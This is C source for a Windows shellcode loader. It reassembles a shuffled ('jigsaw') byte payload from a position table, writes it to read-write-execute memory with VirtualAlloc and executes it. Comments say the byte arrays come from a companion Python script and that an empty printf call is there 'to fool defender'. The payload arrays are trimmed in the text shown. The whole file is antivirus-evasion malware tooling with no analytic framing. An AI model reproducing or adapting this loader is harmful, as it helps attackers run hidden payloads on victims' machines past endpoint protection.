#include <windows.h>
#include <stdio.h>

// Replace with actual shellcode length
#define SHELLCODE_LENGTH 782 

unsigned char jigsaw[SHELLCODE_LENGTH] = { 0x36, 0x10, 0x6a, 0xba, 0x48, 0x53,
---Trimmed---
0x31, 0x69, 0x53, 0x10, 0x8b, 0xe7 }; // jigsaw shellcode from the python script

int positions[SHELLCODE_LENGTH] = { 309, 694, 624, 703, 100, 610, 
---Trimmed---
436, 281, 243, 699, 26, 720 }; // Actual positions of bytes (from the python script) 

int main(void)
{
    // Allocate memory in a writable, executable region
    void* exec_mem = VirtualAlloc(0, SHELLCODE_LENGTH, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("Failed to allocate memory for shellcode.\n");
        return 1;
    }

    unsigned char shellcode[SHELLCODE_LENGTH] = { 0x00 };
    int position;

    // Reconstruct the payload
    for (int idx = 0; idx < SHELLCODE_LENGTH; idx++) {
        position = positions[idx];
        printf(""); //Just to fool defender
        shellcode[position] = jigsaw[idx];
    }

    memcpy(exec_mem, shellcode, SHELLCODE_LENGTH);
    printf("[+] Copied shellcode to allocated memory\n");
    void (*func)() = (void (*)())exec_mem;
    printf("[+] Executing shellcode in memory...\n");
    func();

    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}
